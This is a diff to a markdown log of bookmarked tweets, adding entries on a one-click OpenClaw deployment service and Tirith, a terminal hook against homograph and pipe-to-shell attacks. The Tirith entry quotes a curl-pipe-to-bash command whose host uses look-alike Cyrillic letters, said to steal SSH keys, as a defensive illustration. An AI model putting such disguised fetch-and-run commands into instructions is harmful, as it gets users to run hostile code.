@@ -106,6 +106,44 @@
 
 # Monday, February 2, 2026
 
+## @saviomartin7 - SimpleClaw: One-Click OpenClaw Deployment
+
+> weekend side project: https://t.co/J0O5TqbCCf
+>
+> > ultra simple one-click deploy OpenClaw done under 1 min
+> > built for all normal people
+
+- **Tweet:** https://x.com/saviomartin7/status/2018437642820731148
+- **Link:** https://www.simpleclaw.com/
+- **Filed:** [simpleclaw.md](./knowledge/tools/simpleclaw.md)
+- **What:** Weekend side project that provides ultra-simple one-click deployment for OpenClaw, allowing anyone to deploy a 24/7 OpenClaw instance in under 1 minute without technical knowledge.
+
+---
+
+## @sheeki03 - Tirith: Terminal Security Against Homograph Attacks
+
+> Be honest. When was the last time you actually read a command before pasting it into your terminal?
+>
+> Because these two lines look identical:
+>
+> curl -sSL https://install.example-cli | bash
+> curl -sSL https://іnstall.example-clі | bash
+>
+> One installs your tool. The other steals your SSH keys.
+>
+> That і? Cyrillic. Not Latin. Your browser would block it. Your terminal doesn't even blink.
+>
+> Vibe coding made this 100x worse. Everyone's pasting commands from ChatGPT and random repos like it's nothing. We're all one bad curl | bash away from losing everything.
+>
+> So I built the fix: "tirith". Invisible shell hook. Catches homograph attacks, ANSI injection, hidden commands, dotfile overwrites before they execute. 30 rules. Local only. No telemetry.
+
+- **Tweet:** https://x.com/sheeki03/status/2018382483465867444
+- **Link:** https://github.com/sheeki03/tirith
+- **Filed:** [tirith.md](./knowledge/tools/tirith.md)
+- **What:** Rust-based terminal security tool that protects against homograph attacks, ANSI injection, and pipe-to-shell exploits with an invisible shell hook—addressing security gaps that browsers solved but terminals haven't.
+
+---
+
 ## @ollama - Easy Setup of OpenClaw with Ollama Launch
 
 > Make it easy to use @openclaw with Ollama launch to connect with local models that can run on your own device.
